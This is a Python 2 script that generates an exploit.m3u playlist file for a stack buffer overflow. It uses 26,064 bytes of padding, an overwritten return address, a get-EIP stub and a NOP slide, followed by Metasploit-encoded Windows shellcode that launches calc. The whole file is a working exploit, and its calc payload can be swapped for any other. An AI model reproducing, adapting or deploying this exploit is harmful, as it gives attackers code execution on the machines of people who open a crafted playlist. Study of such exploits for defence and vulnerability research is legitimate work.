import struct

OUTPUT_FILE = "exploit.m3u"


def get_shellcode():
	# windows/exec - 216 bytes
	# http://www.metasploit.com
	# Encoder: x86/shikata_ga_nai
	# VERBOSE=false, PrependMigrate=false, EXITFUNC=seh, CMD=calc
	buf = ""
	buf += "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
	buf += "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
	buf += "\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
	buf += "\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
	buf += "\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
	buf += "\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
	buf += "\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
	buf += "\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
	buf += "\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
	buf += "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
	buf += "\x7f\xe8\x7b\xca"
	return buf


def generate_exploit():
	x = "A" * 26064
	eip = struct.pack('<I', 0x7cdeb7a3)
	nope_slide = "\x90" * 25
	prepend_esp = "XXXX"
	preshellcode = "BB"  # offset is 2
	get_eip = "\x33\xC0\x83\xF8\xFF\x74\x0A\xB8\xFF\xFF\xFF\xFF\xE8\xF1\xFF\xFF\xFF\x58"
	jmp_dword_ptr_eax = "\xff\x20"
	shellcode = get_shellcode()
	buffer = x + eip + prepend_esp + preshellcode + get_eip + jmp_dword_ptr_eax + nope_slide + shellcode
	return buffer


def write_file(buffer):
	try:
		with open(OUTPUT_FILE, "w") as f:
			f.write(buffer)
	except IOError:
		print "Failed to write file !"


def main():
	exploit = generate_exploit()
	write_file(exploit)
	print "Exploit generated !"


if __name__ == "__main__":
	main()
